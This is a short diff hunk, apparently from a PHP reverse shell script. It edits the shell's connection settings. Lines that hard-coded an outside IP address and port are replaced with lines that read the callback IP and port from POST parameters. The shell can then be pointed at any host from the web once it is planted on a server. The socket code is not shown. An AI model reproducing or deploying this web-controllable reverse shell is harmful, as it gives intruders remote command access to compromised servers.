@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '$_POST['104.214.36.7']';  // CHANGE THIS
-$port = $_POST['4321'];       // CHANGE THIS
+$ip = $_POST['ip'];  // CHANGE THIS
+$port = $_POST['p'];       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
